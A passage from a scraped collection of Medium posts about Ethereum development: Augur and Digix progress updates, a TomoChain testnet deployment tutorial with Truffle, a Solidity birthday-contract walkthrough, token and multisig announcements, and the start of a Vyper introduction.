Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.", "responses": 1, "tags": ["Blockchain", "Cryptography", "Token Bonding Curve", "Development", "Coding"]}, {"title": "Digix Dev Update \u2014 19th Sep 2017", "post_link": "https://medium.com/@Digix/dev-updates-c940e5203c9d?source=search_post", "author_name": "Digix", "author_link": "https://medium.com/@Digix", "publish_date": "2017-09-19", "last_modified_date": "2018-03-02", "readtime": "1.44", "claps": 350, "voters": 23, "content": "Digix Dev Update \u2014 19th Sep 2017DigixFollowSep 19, 2017 \u00b7 2 min readLast week our Solidity dev team completed the full tests for two of our core libraries. We now have 100% test coverage for our Collections and State Machine libraries.Collections LIbraryState Machine LibraryThis week our CTO is in the Philippines to train 2 of our offshore developer resource who will be helping us with our Solidity and Truffle work as part of our goal this year is to scale our development efforts. They will hence be able to support not only our core business but also future projects for DigixDAO.Last week, Chris completed work on Dijix by adding the Dijix Attestation plugin \u2014 a generic data type that includes an \u201cattestation\u201d field and \u201cproofs\u201d field, which will be used for each of the PoA actor types to define what it is they are proving (for example, \u201cI received asset X (and this is it\u2019s metadata), here are 3 documents proving this\u201d. Dijix and it\u2019s plugins are now transpiled into ES5 for compatability.He also wrote a \u2018POA-Genesis\u2019 script, which makes it easy to convert files and data into IPFS-hosted attestations. POA-Geneis can be run from a folder containing a mixture of csv, jpeg, pdf and pngs, and will parse the CSV files, create a data structure of attestations, and pass them into Dijix to be processed into dijix-attestations, dijix-pdfs and dijix-images (along with thumbnails). It then generates a JSON report that can be passed to the PoA contract system and linking. This script means that we can easily generate the initial \u2018genesis\u2019 configuration for the PoA system, and the initial state of DGX 2.0 can be easily understood and configured by non-programmers by editing the CSV file.There was a minor update to doxity to fallback to the old style of `@returns` if it\u2019s not using JSON.He also wrote and executed a multiplexer contract, which can be used for sending ETH or ERC20 tokens to a large number of users in a single transaction. This contract was used to reward those who contributed to the recent survey.Finally, he began work on the (still pending) Proof of Asset API, by integrating the new mock pagination system. This Asset Explorer will be it\u2019s own dapplet and imported into the Marketplace app.", "responses": 0, "tags": ["Ethereum", "Blockchain"]}, {"title": "How to compile, deploy and test a Smart Contract on TomoChain testnet", "post_link": "https://medium.com/@nuuneoi/how-to-compile-deploy-and-test-a-smart-contract-on-tomochain-testnet-505eca8c9586?source=search_post", "author_name": "Sittiphol Phanvilai", "author_link": "https://medium.com/@nuuneoi", "publish_date": "2018-06-14", "last_modified_date": "2018-06-15", "readtime": "9.44", "claps": 367, "voters": 21, "content": "How to compile, deploy and test a Smart Contract on TomoChain testnetSittiphol PhanvilaiFollowJun 14, 2018 \u00b7 10 min readThis article consists of the example Solidity smart contract source codes and the full instructions to:Setup Truffle, the most popular development framework for Ethereum which also works perfectly for TomoChain.Create a TomoChain wallet.Obtain Wallet\u2019s Backup KeyRequest fund to the created TomoChain wallet.Explore the Block ExplorerCompile and deploy the created smart contract to TomoChain testnet.Connect Metamask to TomoChain testnet.Create a front end website and make it interact with TomoChain smart contract through web3.js.Required KnowledgesTo understand to whole things clearly, you need to have an knowledge on Solidity, Truffle and web3.js. Anyway, even if you don\u2019t, you still can follow the instructions step by step to complete the codelab.What is TomoChain?TomoChain is an Ethereum fork that performs significantly better. Its block time was reduced from 15s to just 2s and the transaction fee is closed to zero.And since it is an Ethereum fork, any development kit or programming language that works for Ethereum will also works for TomoChain!TomoChain is developed by Vietnam blockchain developer who is a former project lead of the famous NEM. Mainnet is expected to be live on Q4'18. Anyway, testnet is now already working and is also already opened to any developer to test their own dApp on it with no cost.Get Started: InstallationThere are two applications that we need to install through npm. The first one is Truffle, the development framework for Ethereum. We will use it to compile and deploy our smart contract to the testnet. And the second one is http-server, we will use it to create a simple http server to test our front-end website.$ npm install -g truffle http-serverAnd then let\u2019s clone tomochain-dapp-example repository to your local machine. All of the required codes are packed inside the repository.$ git clone git@github.com:nuuneoi/tomochain-dapp-example.gitInstall required npm package.$ cd tomochain-dapp-example$ npm installThat\u2019s all. Your compiler toolchain is now ready!Create a TomoChain WalletTo create a TomoChain wallet, just do the following easy steps:Browse to https://wallet.tomocoin.io/Click on + CREATE NEW WALLET button.You will now have a TomoWallet! Address will be shown on the top left area. Write it down somewhere. We will use it in many steps below.Easy, huh?Obtain Wallet\u2019s Backup KeyBackup Key is a mnemonic seed representing the private spend key. It is pretty important, without it you will not be able to spend the balance in your address. Just don\u2019t forget to write it down somewhere or your wallet may be lost forever.Browse to https://wallet.tomocoin.io/Click on three dots menu at the right top position and click at SHOW YOUR BACKUP KEY. You will see the dialog popped up like this.Copy the words on the last row and write them down somewhere. (These words are also needed to be put in our source code in the smart contract deployment step below.)Please note that this mnemonic seed has to be kept private. Don\u2019t give it to anyone or post it to the public space otherwise your might lose the entire balance to the bad guy.You could now close the wallet tab since we will not use this site anymore. We just need it to generate an address and obtain the associated backup key.Request fundFund is needed to do stuff like smart contract deployment. Don\u2019t worry, it does not cost you any buck since it is the testnet! You can simply request some fund to be transferred to your wallet in few easy steps:Browse to https://faucet.tomochain.com/Put your wallet address to the textbox and make sure you pass the captcha test and then click on REQUEST 1 TOMO button.Wait for like 5\u201310 seconds and then \u2026 tadaaaa. Your wallet should now have 1 TOMO transferred to. Let\u2019s go check it.Explore the Block ExplorerTo check to latest balance of the address, let\u2019s do it in Tomoscan a.k.a. the TomoChain block explorer!Browse to https://explorer-testnet.tomochain.com/In the search box on the top right area, enter the address and then press the enter key.The TOMO Balance should be shown as 1 TOMO like this.Tips: Don\u2019t look at the TOMO USD Balance since it may be quite depressing right now.Now your wallet has an enough balance to do the entire things in this tutorial so \u2026 let\u2019s go ahead!Compile and deploy the created smart contract to TomoChain testnetThe source code in this git repository is written in Truffle framework which is pretty handy. You can compile and do things in just one command line.Look at the source codeThis is a Solidity source code used in this tutorial. You can find it in contracts/SimpleContract.sol file.pragma solidity ^0.4.18;contract SimpleContract {    event BalanceUpdated(uint balance);    uint balance;    constructor() public {        // Set initial balance as 1000        balance = 1000;    }    function setBalance(uint newBalance) public {        // Cap balance to be between 0 to 10000 (inclusive)        require(newBalance <= 10000);        // Set new balance        balance = newBalance;        // Emit an event        emit BalanceUpdated(balance);    }    function getBalance() public view returns(uint) {        return balance;    }}This smart contract is super basic. It allows you to set the public variable balance through setBalance function and you can retrieve the balance by calling getBalance. If you are already familiar with Solidity, you should understand the whole code in no time.CompilingTo compile the source code, just type this command in the repository directory.$ truffle compileThe following result should be shown.Compiling ./contracts/Migrations.sol...Compiling ./contracts/SimpleContract.sol...Writing artifacts to ./build/contractsNow your smart contract has already been compiled. The compiled code are stored in the build directory. You can go check it out if you want to.Setting up the Deployment WalletNow it is almost ready to deploy to the testnet. Anyway, we need to specify the TomoChain wallet to deploy the smart contract first. Of course, the wallet we are going to use is the one that we created in the previous step. Here is the steps toOpen truffle.js file. Here is the content inside.'use strict'var HDWalletProvider = require(\"truffle-hdwallet-provider\");var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';module.exports = {  networks: {    development: {      host: \"127.0.0.1\",      port: 7545,      gas: 4000000,      network_id: \"*\"    },    tomotestnet: {      provider: function() {        return new HDWalletProvider(mnemonic, 'https://testnet.tomochain.com');      },      gas: 1000000,      network_id: 89    }  }};2. Copy the backup key obtained in the previous step and paste it as a value of mnemonic variable.var mnemonic = '<PUT YOUR WALLET BACKUP KEY HERE>';Done. Please note that the tomotestnet network will be used to deploy the smart contract we created. However, if you are familiar with Ganache, you could use the development network to do the local test as well if you want to.DeployingNow it is time to deploy the smart contract to the TomoChain testnet! You can deploy the compiled smart contract using the following command.$ truffle migrate --network tomotestnetHere is the expected result.Using network \u2018tomotestnet\u2019.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x081825424ce179259d661e2cd508b6a3ec5d3c622275168bff3f0d8460348c3f  Migrations: 0x65730da7e39d3787723a8949bc7d41e7f0f013baSaving successful migration to network...  ... 0xd96186343a751f2365d6311d6c7c52d67a86eee04854c40806a628526b0a573aSaving artifacts...Running migration: 2_deploy_contracts.js  Deploying SimpleContract...  ... 0xe80a4bac1ebbfcdd5170d469aa3998f1ee292227b3c7fa677e108135a7feb705  SimpleContract: 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4beSaving successful migration to network...  ... 0x1397e27ad32783349568f65397e81f54dd3b1c36aa9405f06a804b271a23a88cSaving artifacts...Don\u2019t be surprise if those hex code are not the same as mine since they would be different for each person.It is worth noting that the long hex code are the TxHash while the short one are contract address. If you want to play around, please feel free to copy those hex code in block explorer and see the details. Anyway, I will not go over those stuffs since it is too details.Alright, although there are a lot of alien stuff printed out right now but actually the only address that we need to use in the further step is 0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be which is the contract address of SimpleContract we created. Please note that your contract address will be different than mine so please ignore my address and use yours instead.Go Checking the Deployment TransactionThe deployment steps are actually simply a set of transactions so we can see them on block explorer. So \u2026 let\u2019s go check them out! Just simply go to the Tomoscan page and enter your address. 4 new transactions would be shown like below.No action item on this. Just want you to make sure that your contract deployment has successfully been done on TomoChain testnet.You may already notice that how fast the deployment step above was. It used just around 20 seconds to finish or just 5 seconds for each transaction created to be confirmed. Super fast !Connect Metamask to TomoChain testnet.Metamask will be used as a provider to create a transaction and interact with smart contract on the testnet. (As I already mentioned above, everything that works with Ethereum will also work with TomoChain).However, TomoChain is not natively supported on Metamask. We need to manually define the custom rpc server for TomoChain testnet. Here is the steps to do:Install Metamask for Chrome2. Click on the Metamask icon on address bar. Click on the top left menu and choose Custom RPC3. Type https://testnet.tomochain.com in the RPC textbox and then click Save4. Click on Restore from seed phrase and put the mnemonic from above step to the Wallet Seed text area. Also don\u2019t forget to set the password to protect the wallet from people who share the computer with you.5. You should now be good. The wallet supposes to be shown correctly in both address and balance.Please note that the unit of the wallet here is TOMO but since Metamask does not know TOMO so it just shows as ETH as you can see above.Congratulations! Metamask is now ready to interact with TomoChain testnet!Create a Front-End Website Interacting with the Smart ContractSimple demo website used to interact with the deployed smart contract has also come along with tomochain-dapp-example repository. You can find it in web directory. The only file you need to work with is index.html. The web is almost ready to run but still need some modification. Please do the following steps.Find the abi json value from build/contracts/SimpleContract.json, copy it and replace the abi value in index.html with that json array, for example,.var abi = [    {      \"inputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"constructor\"    },    {      \"anonymous\": false,      \"inputs\": [        {          \"indexed\": false,          \"name\": \"balance\",          \"type\": \"uint256\"        }      ],      \"name\": \"BalanceUpdated\",      \"type\": \"event\"    },    {      \"constant\": false,      \"inputs\": [        {          \"name\": \"newBalance\",          \"type\": \"uint256\"        }      ],      \"name\": \"setBalance\",      \"outputs\": [],      \"payable\": false,      \"stateMutability\": \"nonpayable\",      \"type\": \"function\"    },    {      \"constant\": true,      \"inputs\": [],      \"name\": \"getBalance\",      \"outputs\": [        {          \"name\": \"\",          \"type\": \"uint256\"        }      ],      \"payable\": false,      \"stateMutability\": \"view\",      \"type\": \"function\"    }  ];2. Replace the contract address with your own SimpleContract contract address, for example,var contractAddress = '0xb9cb9aa779c0ae4d6fe8a2292fc61233c5cad4be';3. Source code is now ready. Now it is time to spin up the http server by going to Terminal and type the following command.$ cd web$ http-server .The server is now launched on port 8080. You can now browse to the web created through browser at http://localhost:8080 and give a test!TestOnce opened, front-end web will immediately call getBalance() function and show the result in the above area.You can input the new balance you need and click at Set New Balance button to set the new value.And since this operation requires Metamask to create and sign a transaction for you, Metamask will be automatically launched with the predefined parameter calling to setBalance() function on the deployed smart contract. Please feel free to review those Tx parameter and then just simply click on SUBMIT button.The transaction progress will be updated in the below area. You can also view the transaction information from the TxHash row if you want to.It is worth noting that the transaction is consistency confirmed in just 4\u20135 seconds after your Tx has been created which is super fast!! (2 seconds of block time and 2-3 seconds of network latency.)Congratulations! Your first smart contract is now deployed on TomoChain testnet and you can also interact with it through simple web3.js provider on web front-end!Sorry for not going over the front-end source code because I am afraid that it would be too much. However, the source code is not so complicated, please feel free to review it yourself!AuthorTutorial created by Sittiphol Phanvilai (nuuneoi)", "responses": 0, "tags": ["Ethereum", "Tomochain", "Solidity", "Truffle", "Smart Contract"]}, {"title": "Augur Weekly Development Update \u2014 December 13th", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-december-13th-c10f63ad825f?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-12-14", "last_modified_date": "2018-06-13", "readtime": "1.43", "claps": 268, "voters": 22, "content": "Augur Weekly Development Update \u2014 December 13thAugurFollowDec 14, 2017 \u00b7 2 min readWe published the Solidity Compiler audit report this past week, performed by Sergio Lerner of Coinspect. It\u2019s important to note that this audit is not for the Augur contracts, but for the Solidity Compiler found in ethereum/solidity. This audit confirms that Solidity is a much stronger foundation to build on over Serpent, with only 10 low-risk issues found, and no medium or high.Solidity Compiler Audit ReportIn September 2017, Augur engaged Coinspect to perform a security audit of the Solidity Compiler. The objective of the\u2026medium.comContract audits are in their final phases. We\u2019re changing a few minor things in the reporting contracts, which are planned to be audited right after delivery of the initial reports. The UI is getting wired up with Augur Node, and dev.augur.net should also be wired up with real data in the coming week.A prior contractor, Tom Haile, is also joining us full time as a full-stack developer! Make sure to say hi to him (@tomhaile) in our chat.Questions from the week:Augur token and forking?How are scalar values reported?What is the link between dynamic Reporter fees and REP price?How will Augur handle malicious markets?Questions? Ask us on StackExchange. Wanna chat? Join our Discord.Updated Repositories:Augur Contracts (augur-core):AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugur Client Front-End (augur):AugurProject/auguraugur \u2014 Augur front-endgithub.comAugurJS (augur-js):AugurProject/augur.jsaugur.js \u2014 Augur JavaScript APIgithub.comAugur Node (augur-node):AugurProject/augur-nodeaugur-node \u2014 Public Augur node for serving market datagithub.comAugur Documentation (augur-docs):Cheers,The Augur Team", "responses": 1, "tags": ["Blockchain", "Ethereum", "Augur", "Bitcoin", "Prediction Market"]}, {"title": "Now open source: friendly multi-signatures for Ethereum \ud83d\udd11", "post_link": "https://medium.com/dsys/now-open-source-friendly-multi-signatures-for-ethereum-d75ca5a0dc5c?source=search_post", "author_name": "Alex Kern", "author_link": "https://medium.com/@alexkern", "publish_date": "2018-05-29", "last_modified_date": "2018-08-15", "readtime": "1.63", "claps": 358, "voters": 17, "content": "Now open source: friendly multi-signatures for Ethereum \ud83d\udd11Today we are open sourcing one of the first building blocks for our decentralized identity system, solidity-sigutils.Alex KernFollowMay 29, 2018 \u00b7 2 min readSigned messages are an increasingly important tool used by decentralized applications. They enable complex access management and delegation patterns and have greater flexibility than raw transactions. Wallet applications such as MetaMask and Toshi support signing transactions via their web3 provider which contracts can verify using ecrecover().In the context of identity management, signed messages play a crucial role in building more secure and accessible wallets. Conventionally, anyone with a user\u2019s private key has full control over their wallet. This is a security vulnerability: any malicious actor with access to the user\u2019s private key can steal all funds.To improve security, it makes sense to require multi-factor approval from more than one device for some or all transactions. A so-called \u201cmultisig identity\u201d often involves a proxy contract that accepts signed transactions from a whitelist of keys. To perform a multisig transaction:Sign: The user signs a transaction message with their private key from multiple devices.Concatenate: The user concatenates the message signatures into a single multi-signature.Verify: The user sends the transaction message and concatenated signatures to their proxy contract, which verifies that enough valid signatures have been provided using solidity-sigutils.Execute: The proxy contract forwards the transaction to the designated contract.Signed messages inherit the security of Ethereum\u2019s web3.personal.sign() and ecrecover(). One important benefit over raw transactions is that users can work with trust-less intermediaries without sharing their private keys. For example, signed messages enable complex transaction funding strategies like gas relays which pay for transaction costs on a user\u2019s behalf. Additionally, identity contracts may choose to use signed messages to implement advanced functionalities such as account recovery logic that does not rely on centralized authorities.solidity-sigutils provides a friendly interface to support the emerging community standards around Ethereum multi-signatures, such as EIP 191 and ERC 1077. It is one part of the Distributed Systems smart contract system, and has a number of uses across a wide range of decentralized applications. We hope you find it useful and contribute! \ud83d\ude0aInterested in joining our team? Check our careers page or drop us a line at careers@distributedsystems.com \ud83d\udea9", "responses": 0, "tags": ["Blockchain", "Digital Signatures", "Ethereum", "Solidity", "Identity"]}, {"title": "Augur Weekly Development Update \u2014 August 9th", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-august-9th-8306fd99c89f?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-08-10", "last_modified_date": "2018-06-14", "readtime": "1.43", "claps": 74, "voters": 11, "content": "Augur Weekly Development Update \u2014 August 9thAugurFollowAug 10, 2017 \u00b7 2 min readWe\u2019re happy to share that the Solidity migration is progressing very well. You can follow its status on GitHub. We\u2019re ~50% done, a bit ahead of schedule. All the reporting contracts have been migrated, with the market contracts next up.Joey gave a talk online with BlockGeeks this past week, where he goes over the Solidity migration status, release schedule, and other details of Augur. His talk has been uploaded below:We\u2019d also like to welcome Serena Randolph to the Augur team! Serena is joining Augur as a front-end developer, where she will be working with our current UI team building the new IDEO designed client. Serena has been a freelance web developer, with clients including IDEO, Netflix and the U.S. State Department. She will be starting in ~2 weeks, make sure to welcome her to the team when you see her in Slack!We wrapped up the REP migration with paying out all EtherDelta and OasisDEX users who had REP tied up in escrow. Any REP locked up in a decentralized exchanges escrow was lost, and required us to manually make those traders whole. It ended up being < ~425 REP, which came from the Forecast Foundation. If you have any questions, please let us know.Our StackExchange is getting a good amount of activity, however more is always better. We need to keep the engagement up in order to prevent the beta proposal from closing. If you\u2019d like to join, shoot us a message on Twitter or in Slack and we can invite you to participate.Augur StackExchangeQ&A for developers, economists and users interested in the open source, decentralized, prediction market, Auguraugur.stackexchange.comUpdated Repositories This Past Week:Augur Contracts (augur-core):AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugur Client Front-End (augur):AugurProject/auguraugur \u2014 Augur front-endgithub.comAugur Documentation (augur-docs):AugurProject/docsdocs \u2014 Augur documentationgithub.comCheers,The Augur Team", "responses": 1, "tags": ["Blockchain", "Augur", "Ethereum", "Prediction Markets", "Bitcoin"]}, {"title": "Augur Weekly Development Update \u2014 September 20th", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-september-20th-9717e17f11f6?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-09-20", "last_modified_date": "2018-04-11", "readtime": "1.35", "claps": 179, "voters": 16, "content": "Augur Weekly Development Update \u2014 September 20thAugurFollowSep 20, 2017 \u00b7 2 min readYesterday we published \u201cSolidity Migration & What\u2019s Next\u201d covering the completion of our migration to Solidity, and what is still left in the pipeline before audits / launch:Solidity Migration & What\u2019s NextSix weeks ago Augur and ZeppelinSolutions disclosed an audit of the Serpent compiler, revealing a critical security\u2026medium.comWe are done with the migration (!), and we highly recommend reading the \u201cWhat\u2019s Next\u201d section of the above post to catch up on what we\u2019ll be working on in the coming weeks. There is still a list of tasks to complete, and the new UI client is just about 50% of the way done. Some PR\u2019s were pushed to the new v3 client (dev.augur.net), our docs received an update, and our backend team is working on sifting through remaining tasks.ZeppelinSolutions on the Solidity migration.As we\u2019ve said, the speed of development has increased since the migration, and we\u2019re finding that new employees are easier to onboard at this time than previously. Our team has been growing quite fast, nearing ~18 people including contractors.We\u2019re internally working on scoping out rough timelines and prioritizing the remaining work. The focus is getting a product out to the world. The first version of Augur will not be the full fledged, no-limits launch. We\u2019re assessing what can be backlogged until post launch, to further increase development velocity and get something out sooner.The Forecast Foundation is still looking to fill a DevOps role. We are also always open to discussing contract Solidity work & auditing with experienced developers. Please reach out if you are interested.Updated Repositories:Augur Contracts (augur-core):AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugur Client Front-End (augur):AugurProject/auguraugur \u2014 Augur front-endgithub.comAugur Documentation (augur-docs):Cheers,The Augur Team", "responses": 0, "tags": ["Blockchain", "Ethereum", "Augur", "Prediction Markets", "Bitcoin"]}, {"title": "PolicyPal Network Crowdsale Smart Contracts", "post_link": "https://medium.com/@palnetwork_/policypal-network-crowdsale-smart-contracts-86abbacf483a?source=search_post", "author_name": "PAL Network team", "author_link": "https://medium.com/@palnetwork_", "publish_date": "2018-03-01", "last_modified_date": "2018-04-25", "readtime": "0.56", "claps": 267, "voters": 14, "content": "PolicyPal Network Crowdsale Smart ContractsPAL Network teamFollowMar 1, 2018 \u00b7 1 min readThe smart contracts are built upon Solidity code, all of which is publicly available for audit, comment and review.The contracts have also been security audited by the world\u2019s leading auditing agency Chain Security.The Github URL for the code is as follows:Github: https://github.com/policypalnet Crowdsale Contract: https://github.com/policypalnet/crowdsale-contract Audit Report: https://github.com/policypalnet/crowdsale-contract/blob/master/audit/ChainSecurity_PolicyPal_audit_report_public.pdfFurther Reading:Website: https://policypal.networkTelegram: https://t.me/policypalnetworkTwitter: https://twitter.com/PolicyPalNETBlog: https://medium.com/@policypalnetWhitepaper: https://www.policypal.network/whitepaperDevelopers who are keen to join our team, please contact hr@policypal.com with information pertaining to your past projects.For information on Partnerships, please contact us at: info@policypal.com", "responses": 0, "tags": ["Blockchain", "Smartcontract", "Token Sale", "Policypal Network"]}, {"title": "\u201cToken Swap Update\u201d", "post_link": "https://medium.com/@Xrtfoundation/token-swap-update-46c8df790306?source=search_post", "author_name": "Xrt Foundation", "author_link": "https://medium.com/@Xrtfoundation", "publish_date": "2018-08-10", "last_modified_date": "2018-08-10", "readtime": "0.79", "claps": 165, "voters": 10, "content": "\u201cToken Swap Update\u201dXrt FoundationFollowAug 10, 2018 \u00b7 1 min readAs we earlier announced that due to payload size vulnerability(https://github.com/OpenZeppelin/zeppelin-solidity/issues/261) in old smart XRT Token contract (0x99092a458b405fb8c06c5a3aa01cffd826019568), we (XRT Foundation) have decided to upgrade the smart contract from version X1.0 to latest version X1.1 that has been deployed at (0x37d404a072056eda0cd10cb714d35552329f8500). There is one more update regarding the token swap.\u2705 Distribution Of New Tokens( IMPORTANT\u2757\ufe0f\u2757\ufe0f\u2757\ufe0f)Now you don't need to worry about withdrawing your tokens from the dashboardXRT Foundation has decided to stop the swapping procedure. From now onwards we will provide you new tokens manually so the legit and valid users don\u2019t have to worry about swapping their old tokens. Request for new tokens will not be accepted. However, the procedure of providing new tokens will start once the ethereum network becomes normal and issue of mempool (a pool of pending transactions) will reduce. Distribution will continue till all the legit holders receive their tokens. XRT is not gonna disappoint anyone. We appreciate your cooperation during Ethereum network problem.\ud83d\ude4f\u2757\ufe0fOne more Important thing. Only genuine/Authentic Holders will get the new tokens in return. So make sure you have earned or purchased them in a legit way\ud83d\ude4fThanks,-XRT FoundationContact\u00a0:For General Query\u00a0:Info@xrtfoundation.orgFor Technical Support\u00a0:Support@xrtfoundation.orgWebsite\u00a0:www.xrtfoundation.org", "responses": 1, "tags": ["Ethereum", "Swap", "Xrt", "Blockchain", "Cryptocurrency"]}, {"title": "Making a Birthday Contract.", "post_link": "https://medium.com/@k3no/making-a-birthday-contract-858fd3f63618?source=search_post", "author_name": "Keno Leon", "author_link": "https://medium.com/@k3no", "publish_date": "2017-12-05", "last_modified_date": "2019-07-23", "readtime": "3.52", "claps": 48, "voters": 14, "content": "Making a Birthday Contract.Intermediate Solidity Ethereum Notes & Development.Keno LeonFollowDec 5, 2017 \u00b7 4 min readLet\u2019s make a Birthday smart contract in Solidity.Note/selfplug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook on getting started:https://www.amazon.com/dp/B078CQ8L7VThe Problem / challenge:To have a contract record it\u2019s birth on the blockchain.To have the contract tell you it\u2019s Birthday.Bonus / Extra Credit: Return the Birthday in a Human Readable way without the need of external UI\u2019s.The contract :pragma solidity ^ 0.4.0;contract DateTime {        function getYear(uint timestamp) public constant returns (uint16);        function getMonth(uint timestamp) public constant returns (uint8);        function getDay(uint timestamp) public constant returns (uint8);}contract BirthDay {  uint public bday;  address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;  DateTime dateTime = DateTime(dateTimeAddr);  function BirthDay() public  {    bday = now;  }  function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }  function getBirthMonth() view public returns (uint8){      return dateTime.getMonth(bday);  }  function getBirthDay() view public returns (uint8){      return dateTime.getDay(bday);  }}Read the Contract :https://kovan.etherscan.io/address/0x86d686cc0e2feaa63834163af8b7a5fb869bb977#readContractDevelopment Notes :The first thing this contract does is record it\u2019s birthday via the now native function which is saved into a variable bday by the constructor:uint public bday;function BirthDay() public  {    bday = now;  }As it is a public variable, you get an automagic getter so anyone can consult it :bday -> 1512417464 uint256Now, dates in Solidity use timestamps, and if you are a developer you shouldn't have much issue converting this unix timestamp to a human readable date\u2026 But I personally believe it would be useful to provide a human readable date for you could easily consult without having a complex client or wallet.Now in order to do so we will be adding considerable overhead and for some reason it is frowned upon, but this is an excercise so this is what we are going to do:We will use an external contract library to parse the timestamp :I'll use Piper Merriam's DateTime contract:https://github.com/pipermerriam/ethereum-datetimeIf you want to check it out or use it I deployed and verified a copy in Kovan:https://kovan.etherscan.io/address/0x8fc065565e3e44aef229f1d06aac009d6a524e822. Calling this library contract.There are multiple ways of calling another contract in solidity depending on what it is you want to accomplish, (read a view, affect state, have an ABI, don\u2019t have one). In this specific case, all we want to do is send a timestamp and get the return value, we also have the ABI in the form of the DateTimesAPI.json found on the repo.The First thing we need is to include our ABI in the form of an abstract contract:contract DateTime {Followed by the function signatures we will use:function getYear(uint timestamp) public constant returns (uint16);function getMonth(uint timestamp) public constant returns (uint8);function getDay(uint timestamp) public constant returns (uint8);}Upon compiling we just feed the :Birthday contract and it will include this one.\u2026The address for our previously deployed DateTime library comes next, it is hardcoded and public although it seems sensible to provide an ownable setter and maybe make it private if need be.address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;\u2026The next step is to create a globally accessible contract instance of the DateTime Library at our specific address:DateTime dateTime = DateTime(dateTimeAddr);A tongue twister of a thing that basically says this is an instance of our abstract contract at this address.\u2026And finally we can use our library inside functions like so:function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }The result :I really wanted to return a single line in the form of day-month-year, but concatenating multiple returns while calling external functions seems to be a fools errand, so I settled for calling them individually, you can query the contract without any external UI and it returns it\u2019s Birthday in pieces (as well as a timestamp):Wrapping up.This is such an interesting contract, for one having the ability to record a contracts birth inside the same contract allows for all kinds of interesting autonomous applications based on time. ( I actually needed this feature for a future payable contract ).On the other hand there is a considerable degree of sophistication needed to add the human readable date feature via a library call. I personally think that it is worth it as a means to provide the convenience to the end user, but every project is different.We also learned how to call an external contract, something that will surely be useful in future contracts.Best,KenoAbout the Author :Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Cryptocurrency"]}, {"title": "Augur Weekly Development Update \u2014 December 6th", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-december-6th-fdecd7d0400f?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-12-07", "last_modified_date": "2018-06-13", "readtime": "1.22", "claps": 92, "voters": 11, "content": "Augur Weekly Development Update \u2014 December 6thAugurFollowDec 7, 2017 \u00b7 2 min readWe\u2019ve received the Solidity compiler report, and intend to publicly disclose it in the coming week. Contract audits are in the final stages, and we should begin receiving feedback and reports over the next two weeks.The UI is being wired up with Augur node, and we\u2019re continually testing our deployments to test networks. We\u2019ve hired Paul Gebheim full time, who you\u2019ll see around as @Paul in our Discord chat. Welcome him to the team if you see him around!Joey did a podcast with Crypto 101 titled \u201cWhat is Augur\u201d, linked below:New knowledge / content for the week:What if the number of markets is well above the number of reporters?Why are reporting fees aggregated by reporting window instead of by market?Where can I find the API to create a market?If you have any questions or want to chat with our community, come join us on Discord.Updated Repositories:Augur Contracts (augur-core):AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugur Client Front-End (augur):AugurProject/auguraugur \u2014 Augur front-endgithub.comAugurJS (augur-js):AugurProject/augur.jsaugur.js \u2014 Augur JavaScript APIgithub.comAugur Node (augur-node):AugurProject/augur-nodeaugur-node \u2014 Public Augur node for serving market datagithub.comAugur Documentation (augur-docs):Cheers,The Augur Team", "responses": 2, "tags": ["Blockchain", "Ethereum", "Augur", "Prediction Markets", "Bitcoin"]}, {"title": "Get Started with Vyper: The Pythonic Ethereum Smart Contract Language", "post_link": "https://medium.com/block-journal/get-started-with-vyper-the-pythonic-ethereum-smart-contract-language-e5e58969087e?source=search_post", "author_name": "Ross Bulat", "author_link": "https://medium.com/@rossbulat", "publish_date": "2018-11-12", "last_modified_date": "2019-05-07", "readtime": "11.0", "claps": 151, "voters": 12, "content": "Get Started with Vyper: The Pythonic Ethereum Smart Contract LanguageGet to know the first real alternative to Solidity smart contractsRoss BulatFollowNov 12, 2018 \u00b7 12 min readVyper is a Python 3 derived programming language for Ethereum Smart contracts, and an alternative to Solidity. All Vyper syntax is valid Python 3 syntax, although it has not adopted the entirety of Python 3\u2019s feature set. Vyper is in its early stages of development, but the open source project is available for us to dive into and contribute to right now.This article will outline the real principles and reasons behind Vyper, the differences to Solidity, and various syntax we should be aware of. Finally we will visit the installation process of Vpyer.I personally like the project \u2014 looking at their example smart contracts is very seducing; they look and feel like Python; the contracts present themselves in a very familiar way Python developers have come to appreciate, and this simplicity is beneficial for reasons we will discuss further down the article.If you would like to familiarise yourself with Solidity as well as Vyper, visit my Solidity on-boarding article aimed at developers to start writing smart contracts with the language:Writing Smart Contracts with Solidity > 0.5A brief walkthrough to start writing Ethereum smart contracts with Solidity 0.5 and abovemedium.comVyper First Glance & PreconceptionsAt a first glance we notice some very nice Pythonic ways that 